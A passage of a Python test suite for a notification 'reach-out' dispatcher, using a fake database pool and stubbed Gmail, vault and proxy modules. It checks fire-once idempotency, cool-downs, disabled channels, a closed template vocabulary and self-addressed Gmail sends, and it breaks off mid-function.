#!/usr/bin/env python3
"""Reach-out: the dispatcher fires once, and only when it should.

Runs as pytest AND as a plain script in the
container-free gate lane (APP_ROOT=<repo> python3 scripts/test_reachout.py).

WHAT THIS IS DEFENDING. A doorbell has exactly two ways to be wrong, and both
are worse than the feature not existing:

  IT RINGS WHEN IT SHOULD NOT. Twice for one event, for an event nobody
  subscribed to, or through a channel the user switched off. A notification
  system that cries wolf gets muted, and a muted channel is how the "your build
  is done" the user actually wanted goes unseen.

  IT DOES NOT RING WHEN IT SHOULD. The first message of a burst is suppressed
  by the cool-down meant to collapse the REST of the burst, so a quiet user is
  left un-nudged — the design calls this out by name.

So the tests below pin, against a pool that stores rows rather than matching
statement shapes:

  1. ONE FIRE. A matching inbox row produces exactly one reachout_log row with
     status='sent', and a second dispatcher pass over the same row produces
     nothing — the UNIQUE (trigger_id, message_id) is the gate, not a flag in
     memory that a restart would forget.
  2. THE COOL-DOWN COLLAPSES A BURST, NOT THE FIRST OF IT. A second message
     inside 120 s lands as skipped_cooldown WITH a row (the suppression is
     recorded, not silent); the same message after the window sends.
  3. A NON-MATCHING EVENT IS IGNORED. Same kind, different payload.event —
     no row at all, because a trigger nobody matched never consumed anything.
  4. A SWITCHED-OFF CHANNEL IS LOGGED, NOT SENT. The user turned it off; the
     log says the trigger matched and nothing went out, so "why didn't it ring"
     has an answer in the record rather than in an absence.
  5. THE CLOSED VOCABULARY IS ENFORCED AT WRITE TIME. {{msg.body}} is refused
     when the channel is CREATED. That is design principle 1 — the platform
     stays out of the content path — implemented as a renderer that has no name
     for the conversation rather than as a policy somebody remembers to apply.
  6. GMAIL WRITES TO ITS OWN ADDRESS AND NOWHERE ELSE. A gmail_send
     channel takes no recipient field at all; it is pinned to one connection at
     creation and needs no second factor, because it cannot widen who a
     credential reaches. The mail it sends — driven through the dispatcher to a
     fake Gmail — is From and To the connection's own account, carries the
     subject and an ABSOLUTE link and never the conversation, and the log row
     holds a masked address and Gmail's id, never the message. Every refusal
     (no token, 401, a redirect) is a failed row with the sentence the user
     needs. The default channel is built ONCE per connection with its
     three triggers, and the connect hook can never fail a connection.
  7. EVERY TOOL OP works against the same pool, and the wiring is in all five
     places check_tool_lanes.py requires.

WHAT THIS DOES NOT CATCH. The pool below implements the statements this code
issues, not PostgreSQL — so column names and the UNIQUE constraint are checked
by reading the migration, and the migration itself is verified by applying it
to a real cseries-postgres both directions. The http_call
transport is exercised against a fake `use_credential`; a real brokered call to
a real provider is left to an in-pod gate.

Symbols under test: server/reachout/service.py (fire, matches, validate_action,
add_channel, add_trigger, test_fire, remove_*), server/reachout/dispatcher.py
(run_once), server/reachout/transports.py (TRANSPORTS, UNBUILT_ACTIONS),
brain/mastercode/runtime/tools.py (_exec_reachout).
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import sys
import types
import uuid
from datetime import datetime, time as _t_cls, timedelta, timezone
from tools_source import tools_source  # tools.py and the modules split out of it

_ROOT = os.environ.get("APP_ROOT") or os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..")
sys.path[:0] = [_ROOT, os.path.join(_ROOT, "brain")]
# The address a reach-out link opens is this Host's one home address, read from
# CSERIES_URL when server.home_origin is first imported. Fixed here, before any
# server import, so the expected link below does not depend on the runner.
os.environ["CSERIES_URL"] = "http://home.cseries.localhost:8800"
HOME_ORIGIN = "http://home.cseries.localhost:8800"

from server.reachout import dispatcher, service, transports  # noqa: E402

FAILED = 0
T0 = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
ENTITY = 9003


def _t(h, m):
    """A bare TIME, which is what the quiet_from / quiet_to columns hold."""
    return _t_cls(h, m)


# Under pytest a printed FAIL is invisible — the test function returns and the
# run is green. So a failed check raises there, and only prints in the gate
# lane, where the exit code below is what carries it.
_UNDER_PYTEST = "pytest" in sys.modules


def check(label: str, ok: bool, detail: str = "") -> None:
    global FAILED
    if ok:
        print(f"  ok   {label}")
        return
    FAILED += 1
    print(f"  FAIL {label}")
    if detail:
        print("       " + str(detail).replace("\n", "\n       "))
    if _UNDER_PYTEST:
        raise AssertionError(f"{label}: {detail}")


# ── A pool that stores rows ───────────────────────────────────────────────
#
# Deliberately NOT a statement-shape matcher for the log table: every claim in
# this file is about what happens on the SECOND attempt, so the idempotency
# constraint and the cool-down read have to be real. The two are implemented
# the way the migration declares them — UNIQUE (trigger_id, message_id) with
# NULL trigger_ids distinct, and MAX(fired_at) over status='sent'.

class UniqueViolationError(Exception):
    """asyncpg's name for a UNIQUE violation. defaults._build catches it BY
    NAME (asyncpg is not importable in the container-free lane), so the fake
    raises a class with exactly that name, not AssertionError."""


class FakePool:
    def __init__(self):
        self.channels: list[dict] = []
        self.triggers: list[dict] = []
        self.log: list[dict] = []
        self.messages: list[dict] = []
        self._seq = {"channel": 0, "trigger": 0, "log": 0}
        self.registry = {"display_name": "Sage", "email": "alex@example.com"}
        # The vault's own reader is stubbed at module level (see _stub_vault);
        # these drive it.
        self.vault_names = [{"logical_name": "twilio", "deactivated_at": None}]
        self.templates = {12: {"name": "nudge", "prompt": "say {{msg.subject}}",
                               "steps": "[]", "recurrence": None}}

    # -- helpers ---------------------------------------------------------
    def _next(self, k: int | str) -> int:
        self._seq[k] += 1
        return self._seq[k]

    def add_message(self, *, kind="system_notification", event=None, subject="Build finished: x",
                    link="/?open=workbench&view=project:7", sent_at=None, project_id=7):
        row = {"message_id": uuid.uuid4(), "subject": subject, "message_kind": kind,
               "payload": {"event": event, "link": link, "project_id": project_id},
               "sent_at": sent_at or T0}
        self.messages.append(row)
        return row

    def sent_rows(self):
        return [r for r in self.log if r["status"] == "sent"]

    # -- the three asyncpg entry points ----------------------------------
    async def fetchval(self, sql, *p):
        s = " ".join(sql.split())
        if "FROM entity_task_templates" in s:
            return 1 if int(p[0]) in self.templates else None
        if s.startswith("INSERT INTO reachout_log") and "RETURNING id" in s:
            entity_id, trigger_id, channel_id, message_id, fired_at = p
            mid = uuid.UUID(str(message_id))
            if trigger_id is not None and any(
                    r["trigger_id"] == trigger_id and r["message_id"] == mid
                    for r in self.log):
                return None                      # UNIQUE (trigger_id, message_id)
            row = {"id": self._next("log"), "entity_id": entity_id,
                   "trigger_id": trigger_id, "channel_id": channel_id,
                   "message_id": mid, "fired_at": fired_at,
                   "status": "pending", "detail": {}}
            self.log.append(row)
            return row["id"]
        if "MAX(fired_at) FROM reachout_log" in s:
            (channel_id,) = p
            sent = [r["fired_at"] for r in self.log
                    if r["channel_id"] == channel_id and r["status"] == "sent"]
            return max(sent) if sent else None
        if "MAX(m.sent_at)" in s:
            seen = {r["message_id"] for r in self.log}
            ts = [m["sent_at"] for m in self.messages if m["message_id"] in seen]
            return max(ts) if ts else None
        if s.startswith("SELECT 1 FROM reachout_channels WHERE entity_id=$1 AND name=$2"):
            _eid, name = p
            return 1 if any(c["name"] == name for c in self.channels) else None
        raise AssertionError(f"unhandled fetchval: {s[:120]}")

    async def execute(self, sql, *p):
        s = " ".join(sql.split())
        if s.startswith("UPDATE reachout_log SET status = 'failed'") or (
                "detail || " in s and "interrupted" in s):
            raise AssertionError("the interrupted sweep uses fetch, not execute")
        if s.startswith("UPDATE reachout_log SET status"):
            row_id, status, detail = p
            for r in self.log:
                if r["id"] == row_id:
                    r["status"] = status
                    r["detail"] = json.loads(detail)
            return "UPDATE 1"
        if s.startswith("INSERT INTO reachout_log"):
            entity_id, trigger_id, channel_id, message_id, detail = p
            mid = uuid.UUID(str(message_id))
            if trigger_id is not None and any(
                    r["trigger_id"] == trigger_id and r["message_id"] == mid
                    for r in self.log):
                return "INSERT 0 0"
            self.log.append({"id": self._next("log"), "entity_id": entity_id,
                             "trigger_id": trigger_id, "channel_id": channel_id,
                             "message_id": mid, "fired_at": T0,
                             "status": "failed", "detail": json.loads(detail)})
            return "INSERT 0 1"
        if s.startswith("UPDATE reachout_channels SET action=$1::jsonb WHERE id=$2 AND entity_id=$3"):
            action, cid, _eid = p
            hit = [c for c in self.channels if c["id"] == cid]
            for c in hit:
                c["action"] = json.loads(action)
            return f"UPDATE {len(hit)}"
        if s.startswith("DELETE FROM reachout_channels"):
            cid, _eid = p
            self.channels = [c for c in self.channels if c["id"] != cid]
            self.triggers = [t for t in self.triggers if t["channel_id"] != cid]
            return "DELETE 1"
        if s.startswith("DELETE FROM reachout_triggers"):
            tid, _eid = p
            before = len(self.triggers)
            self.triggers = [t for t in self.triggers if t["id"] != tid]
            return f"DELETE {before - len(self.triggers)}"
        raise AssertionError(f"unhandled execute: {s[:120]}")

    async def fetch(self, sql, *p):
        s = " ".join(sql.split())
        if "FROM reachout_triggers t" in s:
            out = []
            for t in self.triggers:
                if t["disabled_at"] is not None:
                    continue
                c = next((c for c in self.channels if c["id"] == t["channel_id"]), None)
                if c is None:
                    continue
                out.append({**t, "c_id": c["id"], "c_name": c["name"],
                            "c_kind": c["kind"], "action": c["action"],
                            "cooldown_s": c["cooldown_s"],
                            "quiet_from": c["quiet_from"], "quiet_to": c["quiet_to"],
                            "quiet_tz": c["quiet_tz"],
                            "c_disabled_at": c["disabled_at"]})
            return out
        if "FROM inbox_messages" in s:
            _eid, mark, limit = p
            return sorted([m for m in self.messages if m["sent_at"] >= mark],
                          key=lambda m: m["sent_at"])[:limit]
        if "FROM reachout_channels" in s:
            return list(self.channels)
        if "FROM reachout_triggers" in s:
            return list(self.triggers)
        if s.startswith("UPDATE reachout_log") and "interrupted" in s:
            _eid, cutoff = p
            hit = [r for r in self.log
                   if r["status"] == "pending" and r["fired_at"] < cutoff]
            for r in hit:
                r["status"] = "failed"
                r["detail"] = {**r["detail"], "interrupted": True,
                               "error": "the host stopped between recording "
                                        "this reach-out and sending it; it was "
                                        "not retried"}
            return [{"id": r["id"]} for r in hit]
        if "FROM reachout_log" in s:
            return sorted(self.log, key=lambda r: r["fired_at"], reverse=True)[:p[1]]
        raise AssertionError(f"unhandled fetch: {s[:120]}")

    async def fetchrow(self, sql, *p):
        s = " ".join(sql.split())
        if s.startswith("INSERT INTO reachout_channels"):
            (eid, name, kind, action, cd, qf, qt, qtz, cb) = p
            if any(c["name"] == name for c in self.channels):
                raise UniqueViolationError("UNIQUE (entity_id, name)")
            row = {"id": self._next("channel"), "entity_id": eid, "name": name,
                   "kind": kind, "action": json.loads(action), "cooldown_s": cd,
                   "quiet_from": qf, "quiet_to": qt, "quiet_tz": qtz,
                   "created_by": cb, "created_at": T0, "disabled_at": None}
            self.channels.append(row)
            return dict(row)
        if s.startswith("INSERT INTO reachout_triggers"):
            (eid, cid, label, mk, me, mj, cb) = p
            row = {"id": self._next("trigger"), "entity_id": eid, "channel_id": cid,
                   "label": label, "match_kind": mk, "match_event": me,
                   "match_jsonb": (json.loads(mj) if mj else None),
                   "created_by": cb, "created_at": T0, "disabled_at": None}
            self.triggers.append(row)
            return dict(row)
        if "FROM entity_registry" in s:
            return dict(self.registry)
        if "FROM reachout_channels WHERE id=$1 AND entity_id=$2" in s:
            return next((dict(c) for c in self.channels if c["id"] == p[0]), None)
        if "FROM reachout_channels WHERE name=$1 AND entity_id=$2" in s:
            return next((dict(c) for c in self.channels if c["name"] == p[0]), None)
        if "FROM reachout_channels WHERE id=$1" in s:
            return next((dict(c) for c in self.channels if c["id"] == p[0]), None)
        if "FROM reachout_triggers" in s:
            return next((dict(t) for t in self.triggers if t["id"] == p[0]), None)
        if "FROM entity_task_templates" in s:
            return self.templates.get(int(p[0]))
        raise AssertionError(f"unhandled fetchrow: {s[:120]}")


def _stub_vault_and_stepup(pool: FakePool, *, codes_ok=("424242",)) -> list:
    """Stand in for the two pod-only modules add_channel reaches.

    Both are stubbed at the MODULE the service imports, not monkeypatched onto
    the service, so the service's own import line is what is exercised — a
    rename there fails here rather than silently using a stub nobody calls.

    `verify_stepup` is modelled with its two real properties, because they are
    the wall: it BURNS a code (replay refused) and it returns False when no
    factor is enrolled. Getting either wrong in the stub would let the tests
    pass against a service that had lost them.
    """
    used: list = []
    for pkg in ("server.vault", "server.network"):
        sys.modules.setdefault(pkg, types.ModuleType(pkg))

    def _install(parent: str, leaf: str, mod):
        """Register a stub submodule the way `from pkg import leaf` reads it.

        Setting sys.modules alone is not enough once the REAL package has been
        imported: `from server.vault import store` binds the package's
        ATTRIBUTE, which the real import already set, so the stub would be
        registered and never used. That is not hypothetical — the redirect
        test loads the real server.vault, and without this line the tests
        after it ran against the real vault store and died on
        FakePool.acquire.
        """
        sys.modules[f"{parent}.{leaf}"] = mod
        setattr(sys.modules[parent], leaf, mod)

    ident = types.ModuleType("server.vault.identity")
    ident.host_identity = lambda eid: f"entity:{eid}"
    _install("server.vault", "identity", ident)

    store = types.ModuleType("server.vault.store")

    async def list_names(pool_, *, owner_identity):
        return list(pool_.vault_names)
    store.list_names = list_names
    _install("server.vault", "store", store)

    stepup = types.ModuleType("server.network.nac_stepup")
    remaining = set(codes_ok)

    async def verify_stepup(pool_, code):
        used.append(code)
        if code in remaining:
            remaining.discard(code)     # burned — a replay is refused
            return True
        return False
    stepup.verify_stepup = verify_stepup
    _install("server.network", "nac_stepup", stepup)
    return used


CODE = "424242"


def _log_channel(pool: FakePool, *, name="log-channel", cooldown_s=120,
                 disabled=False, **kw) -> dict:
    row = {"id": pool._next("channel"), "entity_id": ENTITY, "name": name,
           "kind": "log", "action": {"type": "log"}, "cooldown_s": cooldown_s,
           "quiet_from": None, "quiet_to": None, "quiet_tz": None,
           "created_by": "host", "created_at": T0,
           "disabled_at": (T0 if disabled else None), **kw}
    pool.channels.append(row)
    return row


def _trigger(pool: FakePool, channel: dict, *, match_kind="system_notification",
             match_event="build_finished", match_jsonb=None) -> dict:
    row = {"id": pool._next("trigger"), "entity_id": ENTITY,
           "channel_id": channel["id"], "label": "Build finished",
           "match_kind": match_kind, "match_event": match_event,
           "match_jsonb": match_jsonb, "created_by": "host",
           "created_at": T0, "disabled_at": None}
    pool.triggers.append(row)
    return row


# ── 1. ONE FIRE ───────────────────────────────────────────────────────────

def test_a_matching_row_fires_exactly_once():
    async def run():
        pool = FakePool()
        ch = _log_channel(pool)
        _trigger(pool, ch)
        pool.add_message(event="build_finished")

        mark = T0 - timedelta(seconds=1)
        mark = await dispatcher.run_once(pool, ENTITY, mark)
        check("a matching inbox row fires once", len(pool.sent_rows()) == 1,
              f"log={pool.log}")

        # A second pass over the SAME row: the idempotency gate is the unique
        # constraint, so this must hold even though `mark` did not move past it.
        await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
        check("a second pass over the same row fires nothing",
              len(pool.log) == 1 and len(pool.sent_rows()) == 1,
              f"log={pool.log}")

        row = pool.log[0]
        check("the fire is recorded against its trigger and channel",
              row["trigger_id"] is not None and row["channel_id"] == ch["id"])
        check("the rendered text is the subject and the link, never a body",
              row["detail"].get("text", "").startswith("Build finished: x")
              and "/?open=workbench&view=project:7" in row["detail"].get("text", ""),
              row["detail"])
        return mark
    asyncio.run(run())


# ── 2. THE COOL-DOWN ──────────────────────────────────────────────────────

def test_cooldown_collapses_a_burst_but_never_the_first_of_it():
    async def run():
        pool = FakePool()
        ch = _log_channel(pool, cooldown_s=service.DEFAULT_COOLDOWN_S)
        _trigger(pool, ch)
        pool.add_message(event="build_finished", subject="first")
        pool.add_message(event="build_finished", subject="second",
                         sent_at=T0 + timedelta(seconds=10))

        await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
        statuses = [r["status"] for r in pool.log]
        check("the first of a burst sends", statuses[0] == "sent", statuses)
        check("a second inside 120s is suppressed",
              statuses[1] == "skipped_cooldown", statuses)
        check("the suppression is a ROW, not a silence", len(pool.log) == 2,
              f"log={pool.log}")
        check("the row says why", pool.log[1]["detail"].get("cooldown_s") == 120,
              pool.log[1]["detail"])

        # Past the window, the same channel sends again. Driven through
        # service.fire with an explicit clock rather than the dispatcher: the
        # cool-down is measured in REAL time since the last send, not in the
        # inbox rows' timestamps, so a test that only moved sent_at forward
        # would be asserting against the wrong clock and would pass for the
        # wrong reason.
        later = pool.sent_rows()[0]["fired_at"] + timedelta(seconds=121)
        msg3 = {"message_id": uuid.uuid4(), "subject": "third",
                "message_kind": "system_notification",
                "payload": {"event": "build_finished", "link": "/l"}}
        res = await service.fire(pool, ENTITY, channel=ch, message=msg3,
                                 trigger_id=pool.triggers[0]["id"], now=later)
        check("past the cool-down it sends again", res["status"] == "sent", res)

        # And one second INSIDE the window does not, at the same clock.
        msg4 = {**msg3, "message_id": uuid.uuid4()}
        res = await service.fire(pool, ENTITY, channel=ch, message=msg4,
                                 trigger_id=pool.triggers[0]["id"],
                                 now=later + timedelta(seconds=119))
        check("one second inside the window still does not",
              res["status"] == "skipped_cooldown", res)

        check("120s is the design's default, not a number chosen here",
              service.DEFAULT_COOLDOWN_S == 120)
    asyncio.run(run())


# ── 3. A NON-MATCHING EVENT ───────────────────────────────────────────────

def test_a_non_matching_event_is_ignored():
    async def run():
        pool = FakePool()
        ch = _log_channel(pool)
        _trigger(pool, ch, match_event="build_finished")
        pool.add_message(event="site_published")

        await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
        check("a different payload.event fires nothing", pool.log == [],
              f"log={pool.log}")

        # And the kind alone is not enough either, nor is the wrong kind.
        pool.messages.clear()
        pool.add_message(kind="decision", event="build_finished")
        await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
        check("a different message_kind fires nothing", pool.log == [],
              f"log={pool.log}")

        check("match_jsonb narrows further",
              service.matches({"match_kind": "system_notification",
                               "match_event": "build_finished",
                               "match_jsonb": {"project_id": 9}},
                              {"message_kind": "system_notification",
                               "payload": {"event": "build_finished",
                                           "project_id": 7}}) is False)
    asyncio.run(run())


# ── 4. A SWITCHED-OFF CHANNEL ─────────────────────────────────────────────

def test_a_disabled_channel_is_logged_not_sent():
    async def run():
        pool = FakePool()
        ch = _log_channel(pool, disabled=True)
        _trigger(pool, ch)
        pool.add_message(event="build_finished")

        await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
        check("a switched-off channel sends nothing", pool.sent_rows() == [])
        check("but the match is recorded", len(pool.log) == 1, f"log={pool.log}")
        check("and the row says the channel was off",
              pool.log and pool.log[0]["detail"].get("channel_disabled") is True,
              pool.log)
    asyncio.run(run())


# ── 5. THE CLOSED VOCABULARY ──────────────────────────────────────────────

def test_the_conversation_never_travels():
    async def run():
        pool = FakePool()
        check("msg.body is not a reach-out variable",
              "msg.body" not in service.CLOSED_VARS)
        try:
            # A `log` action on purpose: this claim is about the VOCABULARY
            # check, and an http_call would also be refused for not naming a
            # live credential — which would make the test pass with the
            # vocabulary check deleted.
            await service.add_channel(
                pool, ENTITY, name="leaky", kind="log",
                action={"type": "log", "text": "{{msg.body}}"})
            check("a channel referencing msg.body is refused at WRITE time", False,
                  "it was accepted")
        except service.ReachoutError as e:
            check("a channel referencing msg.body is refused at WRITE time",
                  "msg.body" in str(e), str(e))

        check("the closed set is the design's",
              set(service.CLOSED_VARS) == {
                  "msg.subject", "msg.kind", "msg.link", "msg.project_id",
                  "msg.decision_id", "host.name", "user.email"},
              service.CLOSED_VARS)

        # user.* IS open — a phone number the user gave the host lives on the
        # channel row, in their own database, and never on the platform.
        vars_ = service.message_vars(
            {"subject": "s", "message_kind": "k", "payload": {"link": "/l"}},
            host_name="Sage", user_email="c@example.com",
            channel_vars={"phone": "+15551234567"})
        check("user.<field> renders from the channel row",
              service.render("To {{user.phone}} re {{msg.subject}}", vars_)
              == "To +15551234567 re s",
              service.render("To {{user.phone}} re {{msg.subject}}", vars_))
    asyncio.run(run())


# ── 6. GMAIL — the user's own mailbox, to the user's own address ─────────

# Deliberately NOT the registry email (FakePool.registry, alex@example.com):
# a transport that addressed user.email instead of the connection's own account
# would pass every check below if the two were the same string.
GMAIL_ADDR = "owner@mail.example.net"
GMAIL_CONN = {"id": "conn_g1", "provider_key": "gmail", "status": "active",
              "connection_config": {"account_email": GMAIL_ADDR}}


def _gconn(cid: str, addr: str = GMAIL_ADDR, status: str = "active") -> dict:
    return {"id": cid, "provider_key": "gmail", "status": status,
            "connection_config": {"account_email": addr}}


def _stub_gmail(conns=None, token="tok-1", answer=(200, {"id": "g-123"})):
    """Stand in for the integrations store, the token refresh and Gmail itself.

    Replaced ON THE MODULES THE TRANSPORT IMPORTS (storage, connection, and the
    transport's own _gmail_post seam), so a rename on the real import line
    fails here instead of silently using a stub. The store is never the real
    one (the integration_* tables in the Host's Postgres): a test that read it
    would pass or fail on whatever someone connected.

    Returns (sent, restore, rows). `rows` is the live store, so a test can
    RECONNECT the way production does — a new row with a new id, the old one
    marked needs_reauth — instead of calling the builder twice with one id,
    which production never does. `token` may be a dict of connection id ->
    token, so a test can tell which connection authorised a send, or an
    exception the refresh raises. `answer` may be an exception, raised by the
    fake Gmail the way a network fault is.
    """
    from server.integrations.core import connection as conn_mod
    from server.integrations.core import storage
    rows = {c["id"]: {**c, "connection_config": dict(c["connection_config"])}
            for c in (conns if conns is not None else [GMAIL_CONN])}
    sent: list[dict] = []

    def _row(cid):
        r = rows.get(cid)
        return {**r, "connection_config": dict(r["connection_config"])} if r else None

    # Async, as the store is (it lives in the Host's Postgres).
    async def get_connection(cid):
        return _row(cid)

    async def list_connections(user_id=None, provider_key=None):
        return [_row(i) for i, r in rows.items()
                if provider_key in (None, r["provider_key"])]

    async def update_connection(cid, **fields):
        cfg = fields.get("connection_config")
        if cfg is not None and cid in rows:
            rows[cid]["connection_config"] = json.loads(cfg) if isinstance(cfg, str) else dict(cfg)

    async def ensure_fresh_token(cid):
        if isinstance(token, Exception):
            raise token
        return token.get(cid) if isinstance(token, dict) else token

    async def gmail_post(tok, raw):
        sent.append({"token": tok, "raw": raw})
        if isinstance(answer, Exception):
            raise answer
        return answer

    names = ("get_connection", "list_connections", "update_connection")
    orig_store = {n: getattr(storage, n) for n in names}
    orig = (conn_mod.ensure_fresh_token, transports._gmail_post)
    storage.get_connection, storage.list_connections = get_connection, list_connections
    storage.update_connection = update_connection
    conn_mod.ensure_fresh_token, transports._gmail_post = ensure_fresh_token, gmail_post

    def restore():
        for n, f in orig_store.items():
            setattr(storage, n, f)
        conn_mod.ensure_fresh_token, transports._gmail_post = orig
    return sent, restore, rows


def _mail(raw: str):
    import base64 as _b64
    from email import message_from_bytes, policy
    return message_from_bytes(_b64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4)),
                              policy=policy.default)


def test_gmail_send_is_built_and_nothing_is_left_unbuilt():
    check("gmail_send has a transport", "gmail_send" in transports.TRANSPORTS)
    check("no action type is left declared-but-unbuilt", transports.UNBUILT_ACTIONS == {},
          str(transports.UNBUILT_ACTIONS))


def test_a_gmail_channel_takes_no_recipient_and_no_template():
    async def run():
        pool = FakePool()
        sent, restore, _rows = _stub_gmail()
        try:
            for field in ("to", "cc", "bcc", "recipient", "reply_to"):
                try:
                    await service.add_channel(
                        pool, ENTITY, name=f"g-{field}", kind="email",
                        action={"type": "gmail_send", field: "someone@else.example"})
                    check(f"a {field!r} on a gmail_send channel is refused", False, "accepted")
                except service.ReachoutError as e:
                    check(f"a {field!r} on a gmail_send channel is refused, by name",
                          f"takes no {field!r}" in str(e), str(e))
            try:
                await service.add_channel(
                    pool, ENTITY, name="g-body", kind="email",
                    action={"type": "gmail_send", "body": "{{msg.subject}}"})
                check("a body template on a gmail_send channel is refused", False, "accepted")
            except service.ReachoutError as e:
                check("a body template on a gmail_send channel is refused",
                      "takes only connection_id" in str(e), str(e))
            check("no channel was created", pool.channels == [])
            check("and nothing was sent", sent == [])
        finally:
            restore()
    asyncio.run(run())


def test_a_gmail_channel_needs_a_live_connection():
    async def run():
        pool = FakePool()
        _sent, restore, _rows = _stub_gmail(conns=[])
        try:
            await service.add_channel(pool, ENTITY, name="g", kind="email",
                                      action={"type": "gmail_send"})
            check("with no Gmail connected, a gmail channel is refused", False, "accepted")
        except service.ReachoutError as e:
            check("with no Gmail connected, it says to connect Gmail",
                  "connect Gmail first" in str(e), str(e))
        finally:
            restore()
        stale = {**GMAIL_CONN, "status": "needs_reauth"}
        _sent, restore, _rows = _stub_gmail(conns=[stale])
        try:
            await service.add_channel(pool, ENTITY, name="g", kind="email",
                                      action={"type": "gmail_send", "connection_id": "conn_g1"})
            check("a connection that needs sign-in is refused", False, "accepted")
        except service.ReachoutError as e:
            check("a connection that needs sign-in is refused, saying so",
                  "sign in again" in str(e), str(e))
        finally:
            restore()
        check("no channel was created", pool.channels == [])
    asyncio.run(run())


def test_a_gmail_channel_is_pinned_to_one_connection_and_needs_no_code():
    async def run():
        pool = FakePool()
        used = _stub_vault_and_stepup(pool)
        _sent, restore, _rows = _stub_gmail()
        try:
            ch = await service.add_channel(pool, ENTITY, name="g", kind="email",
                                           action={"type": "gmail_send"})
            row = pool.channels[0]
            check("the channel is built", ch.get("name") == "g", str(ch))
            check("it names the connection it sends through",
                  row["action"].get("connection_id") == "conn_g1", str(row["action"]))
            check("it shows the address masked, for the pane",
                  row["action"].get("pinned_to") == "o•••@mail.example.net", str(row["action"]))
            check("and no second factor was asked for — it cannot widen who is reached",
                  used == [], str(used))
            check("action_needs_stepup agrees",
                  service.action_needs_stepup(row["action"]) is False)
        finally:
            restore()
    asyncio.run(run())


def test_the_mail_is_self_addressed_absolute_and_carries_no_conversation():
    from server.deep_link import app_link

    async def run():
        pool = FakePool()
        sent, restore, _rows = _stub_gmail()
        try:
            await service.add_channel(pool, ENTITY, name="g", kind="email",
                                      action={"type": "gmail_send"})
            await service.add_trigger(pool, ENTITY, channel="g", label="Build finished",
                                      match_kind="system_notification",
                                      match_event="build_finished")
            # The link exactly as session.py writes it for a finished build.
            m = pool.add_message(event="build_finished", subject="Build finished: x",
                                 link=app_link("workbench", "project:7"))
            m["body"] = "SECRET CONVERSATION TEXT"
            await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
            check("exactly one mail went out", len(sent) == 1, str(sent))
            mail = _mail(sent[0]["raw"])
            check("it is TO the connection's own address", mail["To"] == GMAIL_ADDR, mail["To"])
            check("and FROM it", mail["From"] == GMAIL_ADDR, mail["From"])
            check("the subject is [host] what-happened",
                  mail["Subject"] == "[Sage] Build finished: x", mail["Subject"])
            text = mail.get_content()
            check("the link is ABSOLUTE, on the host's own address, in the query form",
                  f"{HOME_ORIGIN}/?open=workbench&view=project:7" in text, text)
            check("the conversation never travels", "SECRET" not in sent[0]["raw"]
                  and "SECRET" not in text)
            check("the refreshed token is what authorized it", sent[0]["token"] == "tok-1")
            row = pool.sent_rows()[0]
            check("the log row records a masked address and Gmail's id",
                  row["detail"].get("to") == "o•••@mail.example.net"
                  and row["detail"].get("gmail_id") == "g-123", str(row["detail"]))
            check("and never the message", "raw" not in row["detail"]
                  and GMAIL_ADDR not in json.dumps(row["detail"]), str(row["detail"]))
        finally:
            restore()
    asyncio.run(run())


def test_gmail_refusals_are_failed_rows_with_the_reason():
    """Every refusal is a failed row carrying a sentence the user can act on —
    and only a 401, or a 403 that says the grant lacks the scope, tells them to
    sign in again: a quota or a domain policy is also a 403, and a reconnect
    cannot fix either."""
    scope_403 = (403, {"error": {"code": 403, "message": "Request had insufficient authentication scopes.",
                                 "status": "PERMISSION_DENIED",
                                 "details": [{"reason": "ACCESS_TOKEN_SCOPE_INSUFFICIENT"}]}})
    quota_403 = (403, {"error": {"code": 403, "message": "Daily sending quota exceeded.",
                                 "errors": [{"reason": "dailyLimitExceeded",
                                             "domain": "usageLimits"}]}})
    cases = (
        ({"token": None}, "sign in again", None),
        ({"token": RuntimeError("vault closed")}, "could not be refreshed", None),
        ({"answer": (401, {})}, "sign in again", None),
        ({"answer": scope_403}, "sign in again", None),
        ({"answer": quota_403}, "Daily sending quota exceeded", "sign in again"),
        ({"answer": (429, {"error": {"message": "Rate limit exceeded", "status": "RESOURCE_EXHAUSTED"}})},
         "Rate limit exceeded", "sign in again"),
        ({"answer": (302, {})}, "a redirect", None),
        ({"answer": (500, {})}, "Gmail gave no reason", None),
        ({"answer": OSError("connection reset")}, "could not be reached", None),
    )

    async def run():
        for kw, words, never in cases:
            pool = FakePool()
            _sent, restore, _rows = _stub_gmail(**kw)
            try:
                await service.add_channel(pool, ENTITY, name="g", kind="email",
                                          action={"type": "gmail_send"})
                ch = dict(pool.channels[0])
                ch["cooldown_s"] = 0
                res = await service.fire(pool, ENTITY, channel=ch,
                                         message=pool.add_message(), trigger_id=1)
                err = str(res["detail"].get("error"))
                check(f"{kw} is a failed row", res["status"] == "failed", str(res))
                check(f"{kw} says {words!r}", words in err, err)
                if never:
                    check(f"{kw} does NOT say {never!r}", never not in err, err)
            finally:
                restore()
    asyncio.run(run())


def test_the_real_gmail_post_refuses_redirects_and_leaves_through_the_proxy():
    """The seam itself, not a stub of it: a stubbed _gmail_post cannot catch a
    deleted allow_redirects=False, and it cannot catch a session that skips the
    egress proxy — which is the one way out of an entity pod."""
    from server.integrations.core import egress
    seen: dict = {}

    class _Resp:
        status = 200

        async def json(self, content_type=None):
            return {"id": "g-9"}

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

    class _Session:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        def post(self, url, **kw):
            seen["url"], seen["kw"] = url, kw
            return _Resp()

    real = egress.session

    def fake_session(**kw):
        seen["session_kw"] = kw
        return _Session()

    egress.session = fake_session
    try:
        status, body = asyncio.run(transports._gmail_post("tok", "cmF3"))
    finally:
        egress.session = real
    check("the real seam posts to Gmail's send endpoint",
          seen.get("url") == transports.GMAIL_SEND_URL, str(seen))
    check("with redirects refused", seen.get("kw", {}).get("allow_redirects") is False, str(seen))
    check("through the egress session (the proxy)", "session_kw" in seen, str(seen))
    check("and reads Gmail's id back", (status, body.get("id")) == (200, "g-9"), str(body))

    async def forced():
